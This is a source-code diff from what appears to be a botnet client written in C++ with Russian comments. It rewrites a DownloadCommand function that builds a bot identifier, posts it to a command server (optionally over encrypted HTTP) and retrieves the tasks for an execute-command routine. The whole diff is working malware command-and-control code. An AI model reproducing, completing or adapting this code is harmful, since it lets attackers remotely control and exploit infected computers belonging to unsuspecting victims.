@@ -365,6 +365,7 @@ void StopTaskManager(PTaskManager Manager)
 }
 //----------------------------------------------------------------------------
 
+/*
 bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 {
 	// Загрузить команду/ набор команд
@@ -420,6 +421,60 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
     return Result;
 }
 //----------------------------------------------------------------------------
+
+*/
+
+bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
+{
+	// Загрузить команду/ набор команд
+	bool GenerateURL = STR::IsEmpty(URL);
+
+	if (GenerateURL)
+		URL = GetBotScriptURL(SCRIPT_TASK);
+
+	string BotID = GenerateBotID2(GetPrefix(true).t_str());
+
+	TASKDBG("Task", "Загружаем команду: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());
+
+
+	TBotStrings Fields;
+
+	Fields.AddValue("id", BotID);
+//    Fields.AddValue("ver", BOT_VERSION);
+
+	#ifdef CryptHTTPH
+		TCryptHTTP HTTP;
+		HTTP.Password = GetMainPassword2();
+	#else
+		THTTP HTTP;
+	#endif
+
+	// Загружаем команду
+
+	string Cmd;
+	bool Result = HTTP.Post(URL, &Fields, Cmd);
+
+	if (Result && !Cmd.IsEmpty())
+	{
+		// Для совместимости
+		if (HTMLCode)
+			*HTMLCode = STR::New(Cmd.t_str());
+	}
+	else
+	{
+		TASKDBG("Task", "Для бота отсутствуют команды");
+		MONITOR_MSG(BMCONST(TaskNoCommands), NULL);
+	}
+
+	if (GenerateURL)
+		STR::Free(URL);
+
+    return Result;
+}
+//----------------------------------------------------------------------------
+
+
+
 
 bool DownloadAndExecuteCommand(PTaskManager Manager, PCHAR URL)
 {
